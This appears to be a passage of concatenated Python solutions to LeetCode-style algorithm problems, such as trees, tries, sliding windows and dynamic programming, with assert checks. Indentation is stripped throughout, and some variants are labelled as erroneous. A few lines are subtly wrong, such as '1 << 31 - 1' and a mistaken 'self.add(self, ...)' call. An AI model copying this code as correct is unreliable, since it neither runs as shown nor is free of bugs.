if ret <= 1 << 31 - 1:
return ret
else:
return -1
stk.append(i)
return -1
if __name__ == "__main__":
assert Solution().nextGreaterElement(12) == 21
class Solution:
def reverseWords(self, s: str) -> str:
return " ".join(map(lambda x: x[::-1], s.split(" ")))
class Node:
def __init__(self, val, children):
self.val = val
self.children = children
class Solution:
def maxDepth(self, root: "Node") -> int:
if not root:
return 0
max_child_depth = max([
self.maxDepth(child)
for child in root.children
] or [0])
return max_child_depth + 1
from typing import List
from collections import defaultdict
class Solution:
def subarraySum(self, nums: List[int], k: int) -> int:
h = defaultdict(int)
ret = 0
s = 0
h[s] += 1
for n in nums:
s += n
ret += h[s - k]
h[s] += 1
return ret
from typing import List
class Solution:
def arrayPairSum(self, nums: List[int]) -> int:
nums.sort()
return sum(nums[::2])
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def findTilt(self, root: TreeNode) -> int:
ret = [0]
self.walk(root, ret)
return ret[0]
def walk(self, node: TreeNode, ret) -> int:
if not node:
return 0
l = self.walk(node.left, ret)
r = self.walk(node.right, ret)
ret[0] += abs(l - r)
return l + node.val + r
from typing import List
class Solution:
def arrayNesting(self, nums: List[int]) -> int:
visited = set()
ret = 0
for n in nums:
count = self.dfs(nums, n, set(), visited)
ret = max(ret, count)
return ret
def dfs(self, nums, num, path, visited):
if num in visited:
return 0
visited.add(num)
path.add(num)
self.dfs(nums, nums[num], path, visited)
return len(path)
if __name__ == "__main__":
assert Solution().arrayNesting([5,4,0,3,1,6,2]) == 4
from typing import List
class Solution:
def matrixReshape(self, nums: List[List[int]], r: int, c: int) -> List[List[int]]:
m, n = len(nums), len(nums[0])
if m * n != r * c:
return nums
ret = []
for i in range(m):
for j in range(n):
if (i * n + j) % c == 0:
ret.append([])
ret[-1].append(nums[i][j])
return ret
from collections import defaultdict
class Solution:
def checkInclusion(self, s1: str, s2: str) -> bool:
counter = defaultdict(int)
s1_set = set(s1)
for c in s1:
counter[c] += 1
i = 0
j = 0
while j < len(s2):
if counter[s2[j]] > 0:
counter[s2[j]] -= 1
if j - i + 1 == len(s1):
return True
j += 1
else:
if s2[i] in s1_set:
counter[s2[i]] += 1
i += 1
if j < i:
j = i
return False
if __name__ == "__main__":
assert Solution().checkInclusion("ab", "eidbaooo") == True
assert Solution().checkInclusion("ab", "eidboaoo") == False
MOD = 10 ** 9 + 7
dirs = ((0, 1), (0, -1), (1, 0), (-1, 0))
class Solution:
def findPaths(self, m: int, n: int, N: int, r: int, c: int) -> int:
ret = 0
F = [[0 for _ in range(n)] for _ in range(m)]
F[r][c] = 1
for _ in range(N):
F_new = [[0 for _ in range(n)] for _ in range(m)]
for i in range(m):
for j in range(n):
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < m and 0 <= J < n:
F_new[I][J] = (F_new[I][J] + F[i][j]) % MOD
else:
ret = (ret + F[i][j]) % MOD
F = F_new
return ret
if __name__ == "__main__":
assert Solution().findPaths(2, 2, 2, 0, 0) == 6
assert Solution().findPaths(1, 3, 3, 0, 1) == 12
from typing import List
class Solution:
def findUnsortedSubarray(self, nums: List[int]) -> int:
n = len(nums)
lo, hi = 0, n - 1
while lo < hi and nums[lo] <= nums[lo + 1]:
lo += 1
while lo < hi and nums[hi - 1] <= nums[hi]:
hi -= 1
if hi <= lo:
return 0
mini = float('inf')
maxa = -float('inf')
for i in range(lo, hi + 1):
mini = min(mini, nums[i])
maxa = max(maxa, nums[i])
while lo - 1 >= 0 and nums[lo - 1] > mini:
lo -= 1
while hi + 1 < n and nums[hi + 1] < maxa:
hi += 1
return hi - lo + 1
def findUnsortedSubarray_sort(self, nums: List[int]) -> int:
expected = list(sorted(nums))
i = 0
while i < len(nums) and nums[i] == expected[i]:
i += 1
j = len(nums) - 1
while j >= i and nums[j] == expected[j]:
j -= 1
return j - i + 1
if __name__ == "__main__":
assert Solution().findUnsortedSubarray([2, 1]) == 2
assert Solution().findUnsortedSubarray([2, 6, 4, 8, 10, 9, 15]) == 5
from collections import defaultdict
class Solution:
def minDistance(self, word1: str, word2: str) -> int:
F = defaultdict(lambda: defaultdict(int))
m = len(word1)
n = len(word2)
for i in range(1, m + 1):
for j in range(1, n + 1):
if word1[i-1] == word2[j-1]:
F[i][j] = F[i-1][j-1] + 1
else:
F[i][j] = max(
F[i-1][j],
F[i][j-1],
)
return m - F[m][n] + n - F[m][n]
def minDistance_edit_distance(self, word1: str, word2: str) -> int:
F = defaultdict(lambda: defaultdict(int))
m = len(word1)
n = len(word2)
for i in range(1, m + 1):
F[i][0] = i
for j in range(1, n + 1):
F[0][j] = j
for i in range(1, m + 1):
for j in range(1, n + 1):
if word1[i-1] == word2[j-1]:
F[i][j] = F[i-1][j-1]
else:
F[i][j] = min(
F[i-1][j] + 1,
F[i][j-1] + 1,
)
return F[m][n]
if __name__ == "__main__":
assert Solution().minDistance("sea", "eat") == 2
class Node:
def __init__(self, val, children):
self.val = val
self.children = children
from typing import List
class Solution:
def preorder(self, root: "Node") -> List[int]:
ret = []
if not root:
return ret
stk = [root]
while stk:
cur = stk.pop()
ret.append(cur.val)
for c in reversed(cur.children):
stk.append(c)
return ret
class Node:
def __init__(self, val, children):
self.val = val
self.children = children
from typing import List
from collections import deque
class Solution:
def postorder(self, root: 'Node') -> List[int]:
if not root:
return []
ret = deque()
stk = [root]
visited = set()
while stk:
cur = stk.pop()
ret.appendleft(cur.val)
for c in cur.children:
stk.append(c)
return list(ret)
def postorder_visited(self, root: 'Node') -> List[int]:
ret = []
if not root:
return ret
stk = [root]
visited = set()
while stk:
cur = stk[-1]
if cur in visited:
stk.pop()
ret.append(cur.val)
else:
visited.add(cur)
for c in reversed(cur.children):
stk.append(c)
return ret
from typing import List
from collections import defaultdict
class Solution:
def findLHS(self, nums: List[int]) -> int:
counter = defaultdict(int)
for n in nums:
counter[n] += 1
ret = 0
for k, v in counter.items():
if k + 1 in counter:
ret = max(ret, v + counter[k + 1])
return ret
from typing import List
class Solution:
def findRestaurant(self, list1: List[str], list2: List[str]) -> List[str]:
index = {}
for i, v in enumerate(list2):
index[v] = i
ret = []
mini = float('inf')
for i, v in enumerate(list1):
if v in index:
cur = i + index[v]
if cur < mini:
mini = cur
ret = [v]
elif cur == mini:
ret.append(v)
return ret
from typing import List
class Solution:
def canPlaceFlowers(self, flowerbed: List[int], n: int) -> bool:
if n == 0:
return True
for i in range(len(flowerbed)):
if (
flowerbed[i] != 1 and
(i + 1 >= len(flowerbed) or flowerbed[i+1] != 1) and
(i - 1 < 0 or flowerbed[i - 1] != 1)
):
n -= 1
flowerbed[i] = 1
if n == 0:
return True
return False
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def tree2str(self, t: TreeNode) -> str:
if not t:
return ""
left = self.tree2str(t.left)
right = self.tree2str(t.right)
ret = [str(t.val)]
if left or right:
ret.append("(" + left + ")")
if right:
ret.append("(" + right + ")")
return "".join(ret)
from typing import List
class Solution:
def triangleNumber(self, nums: List[int]) -> int:
ret = 0
nums.sort()
n = len(nums)
for k in range(n-1, 1, -1):
i = 0
j = k - 1
while i < j:
if nums[i] + nums[j] > nums[k]:
ret += j - i
j -= 1
else:
i += 1
return ret
def triangleNumber_error(self, nums: List[int]) -> int:
ret = 0
nums.sort()
n = len(nums)
for i in range(n - 2):
j = i + 1
k = n - 1
while j < k:
if nums[i] + nums[j] > nums[k]:
ret += k - j
k -= 1
else:
j += 1
return ret
def triangleNumber_slow(self, nums: List[int]) -> int:
cache = {}
nums.sort()
n = len(nums)
ret = 0
for i in range(n):
for j in range(i + 1, n):
if (i, j) not in cache:
cur = 0
for k in range(j + 1, n):
if nums[k] < nums[i] + nums[j]:
cur += 1
else:
break
cache[(i, j)] = cur
ret += cache[(i, j)]
return ret
if __name__ == "__main__":
assert Solution().triangleNumber([2,2,3,4]) == 3
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def mergeTrees(self, t1: TreeNode, t2: TreeNode) -> TreeNode:
if not t1 and not t2:
return
node = TreeNode(0)
node.val += t1 and t1.val or 0
node.val += t2 and t2.val or 0
node.left = self.mergeTrees(t1 and t1.left, t2 and t2.left)
node.right = self.mergeTrees(t1 and t1.right, t2 and t2.right)
return node
from typing import List
from collections import deque, defaultdict
import heapq
class Solution:
def leastInterval(self, tasks: List[str], n: int) -> int:
counter = defaultdict(int)
for t in tasks:
counter[t] += 1
maxa = 0
max_cnt = 0
for v in counter.values():
if v > maxa:
maxa = v
max_cnt = 1
elif v == maxa:
max_cnt += 1
page_cnt = maxa - 1
free_page_size = n + 1 - max_cnt
small_tasks = len(tasks) - max_cnt * maxa
idle = max(0, page_cnt * free_page_size - small_tasks)
return len(tasks) + idle
def leastInterval_complicated(self, tasks: List[str], n: int) -> int:
counter = defaultdict(int)
for t in tasks:
counter[t] += 1
pq = [
(-v, k)
for k, v in counter.items()
]
heapq.heapify(pq)
q = deque()
clock = 0
while pq or q:
if q and q[0][0] <= clock:
_, k = q.popleft()
heapq.heappush(pq, (-counter[k], k))
if pq:
_, k = heapq.heappop(pq)
counter[k] -= 1
if counter[k] > 0:
q.append((clock + 1 + n, k))
clock += 1
return clock
if __name__ == "__main__":
assert Solution().leastInterval(["A","A","A","B","B","B"], 0) == 6
assert Solution().leastInterval(["A","A","A","B","B","B"], 2) == 8
class MyCircularQueue:
def __init__(self, k: int):
self.head = 0
self.tail = -1
self.sz = 0
self.k = k
self.lst = [None for _ in range(k)]
def enQueue(self, value: int) -> bool:
if self.sz >= self.k:
return False
self.tail += 1
self.lst[self.tail % self.k] = value
self.sz += 1
return True
def deQueue(self) -> bool:
if self.sz <= 0:
return False
self.lst[self.head % self.k] = None
self.head += 1
self.sz -= 1
return True
def Front(self) -> int:
ret = self.lst[self.head % self.k]
return ret if ret is not None else -1
def Rear(self) -> int:
ret = self.lst[self.tail % self.k]
return ret if ret is not None else -1
def isEmpty(self) -> bool:
return self.sz == 0
def isFull(self) -> bool:
return self.sz == self.k
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def addOneRow(self, root: TreeNode, v: int, d: int) -> TreeNode:
return self.add(root, v, d, 1, "left")
def add(self, node, v, d, cur_d, child) -> TreeNode:
if cur_d == d:
new = TreeNode(v)
setattr(new, child, node)
return new
if node:
node.left = self.add(node.left, v, d, cur_d + 1, "left")
node.right = self.add(node.right, v, d, cur_d + 1, "right")
return node
class Solution2:
def addOneRow(self, root: TreeNode, v: int, d: int) -> TreeNode:
if d == 1:
node = TreeNode(v)
node.left = root
return node
self.add(self, root, v, d, 1)
return root
def add(self, node, v, d, cur_d) -> None:
if not node:
return
if cur_d + 1 == d:
left = node.left
right = node.right
node.left = TreeNode(v)
node.left.left = left
node.right = TreeNode(v)
node.right.right = right
self.add(node.left, v, d, cur_d + 1)
self.add(node.right, v, d, cur_d + 1)
import heapq
from typing import List
class Solution:
def maximumProduct(self, nums: List[int]) -> int:
mxes = heapq.nlargest(3, nums)
mns = heapq.nsmallest(3, nums)
return max(
mxes[0] * mxes[1] * mxes[2],
mns[0] * mns[1] * mxes[0],
)
import bisect
class LogSystem:
def __init__(self):
self.lst = []
def put(self, id: int, timestamp: str) -> None:
bisect.insort(self.lst, (timestamp, id))
def retrieve(self, s: str, e: str, gra: str) -> List[int]:
lo = "0001:01:01:00:00:00"
hi = "9999:12:31:23:59:59"
pre = {
"Year": 4,
"Month": 7,
"Day": 10,
"Hour": 13,
"Minute": 16,
"Second": 19,
}[gra]
s = s[:pre] + lo[pre:]
e = e[:pre] + hi[pre:]
i = bisect.bisect_left(self.lst, (s, 0))
j = bisect.bisect_right(self.lst, (e, float("inf")))
return [id for _, id in self.lst[i:j]]
from typing import List
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def averageOfLevels(self, root: TreeNode) -> List[float]:
ret = []
if not root:
return ret
q = [root]
while q:
n = len(q)
avg = sum(map(lambda node: node.val, q)) / n
ret.append(avg)
cur_q = []
for node in q:
if node.left:
cur_q.append(node.left)
if node.right:
cur_q.append(node.right)
q = cur_q
return ret
from typing import List
class Solution:
def findMaxAverage(self, nums: List[int], k: int) -> float:
cur_sum = sum(nums[:k])
maxa = cur_sum
i = k
while i < len(nums):
cur_sum += nums[i]
cur_sum -= nums[i-k]
maxa = max(maxa, cur_sum)
i += 1
return maxa / k
from typing import List
class Solution:
def findErrorNums(self, nums: List[int]) -> List[int]:
n = len(nums)
acc0 = 0
for i in range(n):
acc0 ^= nums[i]
acc0 ^= i + 1
first_1 = acc0 & - acc0
acc1 = 0
acc2 = 0
for i in range(n):
if nums[i] & first_1:
acc1 ^= nums[i]
else:
acc2 ^= nums[i]
if (i + 1) & first_1:
acc1 ^= i + 1
else:
acc2 ^= i + 1
for i in range(n):
if nums[i] == acc1:
return [acc1, acc2]
return [acc2, acc1]
from typing import List
class Solution:
def findLongestChain(self, pairs: List[List[int]]) -> int:
pairs.sort(key=lambda x: x[1])
n = len(pairs)
ret = 0
cur_end = -float("inf")
for i in range(n):
if pairs[i][0] <= cur_end:
continue
cur_end = pairs[i][1]
ret += 1
return ret
def findLongestChain2(self, pairs: List[List[int]]) -> int:
pairs.sort(key=lambda x: x[1])
n = len(pairs)
ret = 0
i = 0
while i < n:
ret += 1
cur_end = pairs[i][1]
i += 1
while i < n and pairs[i][0] <= cur_end:
i += 1
return ret
class Solution2:
def findLongestChain(self, pairs: List[List[int]]) -> int:
pairs.sort(key=lambda x: tuple(x))
n = len(pairs)
F = [1 for _ in range(n)]
for i in range(n):
for j in range(i):
if pairs[j][1] < pairs[i][0]:
F[i] = max(F[i], F[j] + 1)
return max(F)
if __name__ == "__main__":
assert Solution().findLongestChain([[1,2], [2,3], [3,4]]) == 2
from collections import defaultdict
class Solution:
def countSubstrings(self, s):
F = defaultdict(lambda: defaultdict(bool))
n = len(s)
for i in range(n):
F[i][i] = True
F[i][i+1] = True
for i in range(n-1, -1, -1):
for j in range(i+2, n+1):
if s[i] == s[j-1]:
F[i][j] = F[i+1][j-1]
else:
F[i][j] = False
return sum(
1
for i in range(n)
for j in range(i+1, n+1)
if F[i][j]
)
if __name__ == "__main__":
assert Solution().countSubstrings("aaa") == 6
from typing import List
from collections import defaultdict
class Node:
def __init__(self, chr):
self.chr = chr
self.ended = False
self.children = defaultdict(lambda: None)
class Trie:
def __init__(self):
self.root = Node(None)
@classmethod
def insert(cls, node, w, i):
if not node:
node = Node(w[i])
if i == len(w) - 1:
node.ended = True
else:
nxt = w[i + 1]
node.children[nxt] = cls.insert(node.children[nxt], w, i + 1)
return node
@classmethod
def search(cls, node, w, i):
if not node:
return
if node.chr != w[i]:
return
if node.ended:
return w[:i+1]
elif i + 1 < len(w):
return cls.search(node.children[w[i + 1]], w, i + 1)
else:
return
class Solution:
def replaceWords(self, dic: List[str], sentence: str) -> str:
trie = Trie()
for word in dic:
root = trie.root
root.children[word[0]] = Trie.insert(root.children[word[0]], word, 0)
ret = []
for word in sentence.split(" "):
for child in trie.root.children.values():
searched = Trie.search(child, word, 0)
if searched:
ret.append(searched)
break
else:
ret.append(word)
return " ".join(ret)
if __name__ == "__main__":
assert Solution().replaceWords(["cat", "bat", "rat"], "the cattle was rattled by the battery") == "the cat was rat by the bat"
class Solution:
def minSteps(self, n: int) -> int:
ret = 0
for i in range(2, n+1):
while n % i == 0:
ret += i
n //= i
return ret
def minSteps_dp(self, n: int) -> int:
F = [[float('inf') for _ in range(n+1)] for _ in range(n+1)]
F[1][0] = 0
F[1][1] = 1
for i in range(2, n + 1):
for j in range(i+1):
F[i][j] = min(
F[i][j],
F[i-j][j] + 1,
)
if i % 2 == 0:
F[i][i//2] = min(
F[i][i//2],
F[i//2][j] + 2
)
ret = min(F[n])
return ret
if __name__ == "__main__":
assert Solution().minSteps(7) == 7
assert Solution().minSteps(3) == 3
assert Solution().minSteps(4) == 4
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
from typing import List
from collections import defaultdict
class MerkleHash:
def __init__(self):
self.start_key = 0
self.merkle_hash = defaultdict(self._auto_incr)
def _auto_incr(self):
self.start_key += 1
return self.start_key
def __call__(self, val):
return self.merkle_hash[val]
class Solution:
def __init__(self):
self.counter = defaultdict(int)
self.merkle_hash = MerkleHash()
def findDuplicateSubtrees(self, root: TreeNode) -> List[TreeNode]:
ret = []
self.walk(root, ret)
return ret
def walk(self, cur, ret) -> int:
if not cur:
return self.merkle_hash(None)
subtree_value = (cur.val, self.walk(cur.left, ret), self.walk(cur.right, ret))
merkle_hash = self.merkle_hash(subtree_value)
if self.counter[merkle_hash] == 1:
ret.append(cur)
self.counter[merkle_hash] += 1
return merkle_hash
class Solution2:
def findDuplicateSubtrees(self, root: TreeNode) -> List[TreeNode]:
ret = []
self.walk(root, defaultdict(int), ret)
return ret
def walk(self, cur, counter, ret) -> str:
if not cur:
return "None"
cur_key = ",".join([
self.walk(cur.left, counter, ret),
self.walk(cur.right, counter, ret),
str(cur.val),
])
if counter[cur_key] == 1:
ret.append(cur)
counter[cur_key] += 1
return cur_key
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def findTarget(self, root: TreeNode, k: int) -> bool:
self.root = root
return self.walk(root, k)
def walk(self, node, k):
if not node:
return False
target = k - node.val
if self.find(self.root, target, node):
return True
if self.walk(node.left, k) or self.walk(node.right, k):
return True
return False
def find(self, node, target, existing):
if not node:
return False
if node.val == target:
return node != existing
if target < node.val:
return self.find(node.left, target, existing)
else:
return self.find(node.right, target, existing)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
from typing import List
import heapq
class Solution:
def constructMaximumBinaryTree(self, nums: List[int]) -> TreeNode:
stk = []
for n in nums:
cur = TreeNode(n)
while stk and stk[-1].val < cur.val:
left = stk.pop()
cur.left = left
if stk:
stk[-1].right = cur
stk.append(cur)
return stk[0]
class Solution_heap:
def constructMaximumBinaryTree(self, nums: List[int]) -> TreeNode:
if not nums:
return
h = [(-v, v) for v in nums]
idx = {
v: i
for i, v in enumerate(nums)
}
heapq.heapify(h)
root = None
while h:
_, m = heapq.heappop(h)
root = self.insert(root, m, idx)
return root
def insert(self, node, m, idx):
if not node:
return TreeNode(m)
if idx[m] < idx[node.val]:
node.left = self.insert(node.left, m, idx)
elif idx[m] > idx[node.val]:
node.right = self.insert(node.right, m, idx)
else:
raise
return node
from collections import Counter
class Solution:
def judgeCircle(self, moves: str) -> bool:
counter = Counter(moves)
return counter["L"] == counter["R"] and counter["U"] == counter["D"]
from typing import List
from bisect import bisect_left
from collections import deque
class Solution:
def findClosestElements(self, A: List[int], k: int, x: int) -> List[int]:
n = len(A)
lo = 0
hi = n - k
while lo < hi:
mid = (lo + hi) // 2
if abs(x - A[mid]) > abs(A[mid + k] - x):
lo = mid + 1
else:
hi = mid
return A[lo:lo+k]
def findClosestElements2(self, A: List[int], k: int, x: int) -> List[int]:
n = len(A)
idx = bisect_left(A, x)
ret = deque()
i = idx - 1
j = idx
while k:
if 0 <= i < n and 0 <= j < n:
if abs(A[i] - x) <= abs(A[j] - x):
ret.appendleft(A[i])
i -= 1
else:
ret.append(A[j])
j += 1
elif 0 <= i < n:
ret.appendleft(A[i])
i -= 1
elif 0 <= j < n:
ret.append(A[j])
j += 1
else:
raise
k -= 1
return list(ret)
if __name__ == "__main__":
assert Solution().findClosestElements([1,2,3,4,5], 4, 3) == [1,2,3,4]
assert Solution().findClosestElements([1,2,3,4,5], 4, -1) == [1,2,3,4]
from typing import List
from collections import defaultdict
import heapq
class Solution:
def isPossible(self, nums: List[int]) -> bool:
counter = defaultdict(int)
for e in nums:
counter[e] += 1
F = defaultdict(int)
for e in nums:
if counter[e] == 0:
continue
counter[e] -= 1
if F[e - 1] > 0:
F[e - 1] -= 1
F[e] += 1
elif counter[e + 1] > 0 and counter[e + 2] > 0:
F[e + 2] += 1
counter[e + 1] -= 1
counter[e + 2] -= 1
else:
return False
return True
class Interval:
def __init__(self, end, length):
self.end = end
self.length = length
def __lt__(self, other):
if self.end == other.end:
return self.length < other.length
return self.end < other.end
def __repr__(self):
return repr((self.end, self.length))
class Solution2:
def isPossible(self, nums: List[int]) -> bool:
h = []
for n in nums:
while h and h[0].end + 1 < n:
itvl = heapq.heappop(h)
if itvl.length < 3:
return False
if not h:
heapq.heappush(h, Interval(n, 1))
elif h[0].end + 1 == n:
itvl = heapq.heappop(h)
heapq.heappush(h, Interval(n, itvl.length + 1))
else:
heapq.heappush(h, Interval(n, 1))
for itvl in h:
if itvl.length < 3:
return False
return True
if __name__ == "__main__":
assert Solution().isPossible([1,2,3,3,4,5]) == True
assert Solution().isPossible([1,2,3,3,4,4,5,5]) == True
assert Solution().isPossible([1,2,3,4,4,5]) == False
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def widthOfBinaryTree(self, root: TreeNode) -> int:
if not root:
return 0
ret = 0
q = [(0, root)]
while q:
cur_q = []
left, right = q[0][0], q[-1][0]
ret = max(ret, right - left + 1)
for idx, node in q:
if node.left:
cur_q.append((idx * 2, node.left))
if node.right:
cur_q.append((idx * 2 + 1, node.right))
q = cur_q
return ret
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.sums = []
def checkEqualTree(self, root: TreeNode) -> bool:
self.dfs(root)
total = self.sums.pop()
return total % 2 == 0 and total // 2 in self.sums
def dfs(self, node):
if not node:
return 0
l = self.dfs(node.left)
r = self.dfs(node.right)
s = l + r + node.val
self.sums.append(s)
return s
class Solution:
def __init__(self):
self.exists = False
self.root = None
self.total_sum = None
def checkEqualTree(self, root: TreeNode) -> bool:
self.root = root
self.total_sum = self.dfs(root)
self.dfs(root)
return self.exists
def dfs(self, node):
if not node:
return 0
l = self.dfs(node.left)
r = self.dfs(node.right)
s = l + r + node.val
if node != self.root and self.total_sum != None and self.total_sum == s * 2:
self.exists = True
return s
from typing import List
class Solution:
def checkPossibility(self, A: List[int]) -> bool:
changed = False
for i in range(len(A) - 1):
if A[i] <= A[i + 1]:
continue
if not changed:
if i - 1 < 0 or A[i-1] <= A[i+1]:
A[i] = A[i+1]
else:
A[i+1] = A[i]
changed = True
else:
return False
return True
def checkPossibility_error(self, A: List[int]) -> bool:
changed = False
for i in range(len(A) - 1):
if A[i] <= A[i + 1]:
continue
if not changed:
A[i] = A[i + 1]
if i - 1 < 0 or A[i - 1] <= A[i]:
changed = True
else:
return False
else:
return False
return True
if __name__ == "__main__":
assert Solution().checkPossibility([4,2,3]) == True
assert Solution().checkPossibility([3,4,2,3]) == False
assert Solution().checkPossibility([2,3,3,2,4]) == True
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def trimBST(self, root: TreeNode, L: int, R: int) -> TreeNode:
return self.walk(root, L, R)
def walk(self, node, L, R):
if not node:
return None
node.left = self.walk(node.left, L, R)
node.right = self.walk(node.right, L, R)
if node.val < L:
return node.right
elif node.val > R:
return node.left
else:
return node
class Solution:
def maximumSwap(self, num: int) -> int:
stk = []
nums = list(str(num))
n = len(nums)
for i in range(n-1, -1, -1):
if stk and stk[-1][1] >= nums[i]:
continue
stk.append((i, nums[i]))
for i in range(n):
while stk and stk[-1][0] <= i:
stk.pop()
if stk and stk[-1][1] > nums[i]:
j = stk[-1][0]
nums[i], nums[j] = nums[j], nums[i]
break
return int("".join(nums))
if __name__ == "__main__":
assert Solution().maximumSwap(2736) == 7236
assert Solution().maximumSwap(9973) == 9973
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def findSecondMinimumValue(self, root: TreeNode) -> int:
ret = self.find(root)
return -1 if ret == float('inf') else ret
def find(self, root: TreeNode) -> int:
if not root:
return float('inf')
if root.left and root.right:
if root.left.val == root.val:
left = self.find(root.left)
else:
left = root.left.val
if root.right.val == root.val:
right = self.find(root.right)
else:
right = root.right.val
return min(left, right)
return float('inf')
from typing import List
class LenCnt:
def __init__(self, l, c):
self.l = l
self.c = c
def __repr__(self):
return repr((self.l, self.c))
class Solution:
def findNumberOfLIS(self, A: List[int]) -> int:
if not A:
return 0
n = len(A)
F = [LenCnt(l=1, c=1) for _ in A]
mx = LenCnt(l=1, c=1)
for i in range(1, n):
for j in range(i):
if A[i] > A[j]:
if F[i].l < F[j].l + 1:
F[i].l = F[j].l + 1
F[i].c = F[j].c
elif F[i].l == F[j].l + 1:
F[i].c += F[j].c
if F[i].l > mx.l:
mx.l = F[i].l
mx.c = F[i].c
elif F[i].l == mx.l:
mx.c += F[i].c
return mx.c
if __name__ == "__main__":
assert Solution().findNumberOfLIS([1,1,1,2,2,2,3,3,3]) == 27
assert Solution().findNumberOfLIS([1, 3, 5, 4, 7]) == 2
assert Solution().findNumberOfLIS([2, 2, 2, 2, 2]) == 5
from typing import List
class Solution:
def findLengthOfLCIS(self, nums: List[int]) -> int:
if not nums:
return 0
ret = 1
i = 1
while i < len(nums):
cur = 1
while i < len(nums) and nums[i] > nums[i-1]:
cur += 1
i += 1
i += 1
ret = max(ret, cur)
return ret
from typing import List
from collections import defaultdict
class MagicDictionary:
def __init__(self):
class Node:
def __init__(self, chr):
self.chr = chr
self.end = False
self.children = defaultdict(lambda: None)
class Trie:
def __init__(self):
self.root = Node(None)
def insert(self, cur, s, i):
if not cur:
cur = Node(s[i])
if i == len(s) -1:
cur.end = True
else:
nxt = s[i+1]
cur.children[nxt] = self.insert(cur.children[nxt], s, i + 1)
return cur
def search(self, cur, s, i, modified):
if cur.chr != s[i]:
if modified:
return False
modified = True
if i == len(s) - 1:
return modified and cur.end
for child in cur.children.values():
if self.search(child, s, i + 1, modified):
return True
return False
self.trie = Trie()
def buildDict(self, dic: List[str]) -> None:
for s in dic:
root = self.trie.root
root.children[s[0]] = self.trie.insert(root.children[s[0]], s, 0)
def search(self, word: str) -> bool:
for child in self.trie.root.children.values():
if self.trie.search(child, word, 0, False):
return True
return False
class MapSum:
def __init__(self):
from collections import defaultdict
class TrieNode:
def __init__(self, chr, sum, val):
self.chr = chr
self.sum = sum
self.val = val
self.children = defaultdict(lambda: None)
class Trie:
def __init__(self):
self.root = TrieNode(None, 0, 0)
def insert(self, cur, key, i, val):
if not cur:
cur = TrieNode(key[i], 0, 0)
if i == len(key) - 1:
delta = val - cur.val
cur.val = val
else:
cur.children[key[i+1]], delta = self.insert(cur.children[key[i+1]], key, i + 1, val)
cur.sum += delta
return cur, delta
self.trie = Trie()
def insert(self, key: str, val: int) -> None:
root = self.trie.root
root.children[key[0]], _ = self.trie.insert(root.children[key[0]], key, 0, val)
def sum(self, prefix: str) -> int:
node = self.trie.root
for a in prefix:
if a not in node.children:
return 0
node = node.children[a]
return node.sum
class MapSum2:
def __init__(self):
class TrieNode:
def __init__(self, chr, sum, val):
self.chr = chr
self.sum = sum
self.val = val
self.children = {}
class Trie:
def __init__(self):
self.root = TrieNode(None, 0, 0)
def insert(self, pi, key, i, val):
if key[i] not in pi.children:
cur = TrieNode(key[i], 0, 0)
pi.children[key[i]] = cur
cur = pi.children[key[i]]
if i + 1 < len(key):
cur.children[key[i+1]], delta = self.insert(cur, key, i + 1, val)
else:
delta = val - cur.val
cur.val = val
cur.sum += delta
return cur, delta
self.trie = Trie()
def insert(self, key: str, val: int) -> None:
self.trie.insert(self.trie.root, key, 0, val)
def sum(self, prefix: str) -> int:
node = self.trie.root
for a in prefix:
if a not in node.children:
return 0
node = node.children[a]
return node.sum
class Solution:
def checkValidString(self, s: str) -> bool:
stk_left = []
stk_star = []
for i, c in enumerate(s):
if c == "(":
stk_left.append(i)
elif c == "*":
stk_star.append(i)
else:
if stk_left:
stk_left.pop()
elif stk_star:
stk_star.pop()
else:
return False
while stk_left and stk_star and stk_star[-1] > stk_left[-1]:
stk_star.pop()
stk_left.pop()
return not stk_left
if __name__ == "__main__":
assert Solution().checkValidString("(*))") == True
assert Solution().checkValidString("*(") == False
assert Solution().checkValidString("(*)") == True
from typing import List
class Solution:
def judgePoint24(self, nums: List[int]) -> bool:
return self.dfs(nums, {})
def dfs(self, A, cache):
if tuple(A) not in cache:
n = len(A)
if n == 1:
return abs(A[0] - 24) < 0.001
for i in range(n):
for j in range(i):
a = A[i]
b = A[j]
for c in (a+b, a-b, b-a, a*b, b and a/b, a and b/a):
A_new = A[:j] + A[j+1:i] + A[i+1:] + [c]
A_new.sort()
if self.dfs(A_new, cache):
cache[tuple(A)] = True
return cache[tuple(A)]
cache[tuple(A)] = False
return cache[tuple(A)]
if __name__ == "__main__":
assert Solution().judgePoint24([4, 1, 8, 7]) == True
assert Solution().judgePoint24([1, 2, 1, 2]) == False
class Solution:
def validPalindrome(self, s: str) -> bool:
n = len(s)
i = 0
j = n - 1
while i < j:
if s[i] == s[j]:
i += 1
j -= 1
else:
return self.is_palindrome(s[i:j]) or self.is_palindrome(s[i+1:j+1])
return True
def is_palindrome(self, s):
return s == s[::-1]
if __name__ == "__main__":
assert Solution().validPalindrome("aba") == True
assert Solution().validPalindrome("abca") == True
from typing import List
from collections import defaultdict
class DisjointSet():
def __init__(self):
self.sz = {}
self.pi = {}
def add(self, x):
if x not in self.pi:
self.sz[x] = 1
self.pi[x] = x
def unionize(self, x, y):
p1 = self.root(x)
p2 = self.root(y)
if p1 != p2:
sz1 = self.sz[p1]
sz2 = self.sz[p2]
if sz1 > sz2:
p1, p2 = p2, p1
self.pi[p1] = p2
self.sz[p2] += self.sz[p1]
del self.sz[p1]
def root(self, x):
p = self.pi[x]
if p != x:
self.pi[x] = self.root(p)
return self.pi[x]
def is_union(self, x, y):
if x in self.pi and y in self.pi:
return self.root(x) == self.root(y)
return False
class Solution:
def findRedundantConnection(self, edges: List[List[int]]) -> List[int]:
ds = DisjointSet()
